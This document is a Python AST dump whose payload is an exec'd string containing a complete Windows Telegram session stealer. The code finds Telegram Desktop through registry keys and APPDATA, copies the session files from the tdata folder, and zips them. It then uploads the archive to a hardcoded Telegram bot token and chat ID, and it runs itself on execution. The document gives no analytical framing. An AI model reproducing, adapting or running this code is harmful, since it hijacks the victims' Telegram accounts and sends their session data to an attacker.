Module(
  body=[
    ImportFrom(
      module='base64',
      names=[alias(
        name='b64decode',
        asname=None)],
      level=0),
    Expr(value=Call(
      func=Name(
        id='exec',
        ctx=Load()),
      args=[Constant(
        value='import os\nimport shutil\nimport re\ntry:\n    import requests\nexcept:\n    os.system(\'pip install requests\')\n    import requests\nimport zipfile\nimport uuid\n\ntry:\n    from winreg import HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, OpenKey, QueryValueEx\nexcept:\n    os.system(\'pip install winreg\')\n    from winreg import HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, OpenKey, QueryValueEx\n\n\nTELEGRAM_CHAT_ID = "-1002226869554"\nTELEGRAM_TOKEN = "7127316916:AAFZEzOIDJ0XbyFUxRwHxkQkiT_wdaVx0tg"\nTEMP_DIRECTORY = os.path.join(os.getenv(\'TEMP\', \'/tmp\'), \'tdata\')\n\n\ndef find_telegram_executables():\n    telegram_paths = []\n\n    ROOT_REGISTRY_KEYS = [\n        "tdesktop.tg\\\\shell\\\\open\\\\command",\n        "tg\\\\DefaultIcon",\n        "tg\\\\shell\\\\open\\\\command"\n    ]\n    USER_REGISTRY_KEYS = [\n        "SOFTWARE\\\\Classes\\\\tdesktop.tg\\\\DefaultIcon",\n        "SOFTWARE\\\\Classes\\\\tdesktop.tg\\\\shell\\\\open\\\\command",\n        "SOFTWARE\\\\Classes\\\\tg\\\\DefaultIcon",\n        "SOFTWARE\\\\Classes\\\\tg\\\\shell\\\\open\\\\command"\n    ]\n\n    def clean_registry_value(registry_value):\n        if registry_value.startswith("\\""):\n            registry_value = registry_value[1:]\n            if registry_value.endswith(",1\\""):\n                registry_value = registry_value.replace(",1\\"", "")\n            elif registry_value.endswith("\\"  -- \\"%1\\""):\n                registry_value = registry_value.replace("\\"  -- \\"%1\\"", "")\n        return registry_value\n\n    try:\n        telegram_file = os.path.join(os.getenv(\'APPDATA\'), "Telegram Desktop\\\\Telegram.exe")\n        if os.path.exists(telegram_file):\n            telegram_paths.append(telegram_file)\n\n        for registry_key in ROOT_REGISTRY_KEYS:\n            try:\n                with OpenKey(HKEY_CLASSES_ROOT, registry_key) as key:\n                    executable_path = QueryValueEx(key, "")[0]\n                    executable_path = clean_registry_value(executable_path)\n                    if executable_path not in telegram_paths:\n                        telegram_paths.append(executable_path)\n            except FileNotFoundError:\n                pass\n\n        for registry_key in USER_REGISTRY_KEYS:\n            try:\n                with OpenKey(HKEY_CURRENT_USER, registry_key) as key:\n                    executable_path = QueryValueEx(key, "")[0]\n                    executable_path = clean_registry_value(executable_path)\n                    if executable_path not in telegram_paths:\n                        telegram_paths.append(executable_path)\n            except FileNotFoundError:\n                pass\n\n    except Exception:\n        pass\n\n    return telegram_paths\n\n\ndef has_telegram_data_folder(directory):\n    return os.path.exists(os.path.join(directory, "tdata"))\n\n\ndef is_session_file(file):\n    file_name = os.path.basename(file)\n\n    if file_name in ("key_datas", "maps", "configs"):\n        return True\n\n    return re.match(r"[A-Z0-9]+[a-z0-9]?s?", file_name) is not None and os.path.getsize(file) <= 11264\n\n\ndef is_valid_folder(folder_name):\n    return re.match(r"[A-Z0-9]+[a-z]?$", folder_name) is not None\n\n\ndef send_to_telegram(file_path):\n    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"\n    files = {\'document\': open(file_path, \'rb\')}\n    data = {\'chat_id\': TELEGRAM_CHAT_ID}\n    response = requests.post(url, files=files, data=data)\n    return response.status_code == 200\n\n\ndef steal_sessions():\n    for telegram_path in find_telegram_executables():        \n        try:\n\n            unique_folder_name = str(uuid.uuid4())\n            session_directory = os.path.join(TEMP_DIRECTORY, unique_folder_name)\n\n            if not os.path.exists(session_directory):\n                os.makedirs(session_directory)\n\n            telegram_folder = os.path.dirname(telegram_path)\n            if has_telegram_data_folder(telegram_folder):\n                tdata_folder = os.path.join(telegram_folder, "tdata")\n\n                tdata_temp_folder = os.path.join(session_directory, "tdata")\n                os.makedirs(tdata_temp_folder)\n\n                for root, dirs, files in os.walk(tdata_folder):\n                    for dir in dirs:\n                        if not is_valid_folder(dir):\n                            dirs.remove(dir)  \n\n                    for file in files:\n                        source_path = os.path.join(root, file)\n                        if is_session_file(source_path):\n\n                            relative_path = os.path.relpath(source_path, tdata_folder)\n                            target_path = os.path.join(tdata_temp_folder, relative_path)\n\n                            os.makedirs(os.path.dirname(target_path), exist_ok=True)\n                            shutil.copy2(source_path, target_path)\n\n                zip_file_path = os.path.join(TEMP_DIRECTORY, f"{unique_folder_name}.zip")\n                with zipfile.ZipFile(zip_file_path, \'w\', zipfile.ZIP_DEFLATED) as zipf:\n                    for root, _, files in os.walk(session_directory):\n                        for file in files:\n\n                            zipf.write(os.path.join(root, file),\n                                      arcname=os.path.relpath(os.path.join(root, file), session_directory))\n\n                send_to_telegram(zip_file_path)\n\n                shutil.rmtree(session_directory)\n\n        except Exception as e:\n            print(e)\n\n\nsteal_sessions()',
        kind=None)],
      keywords=[]))],
  type_ignores=[])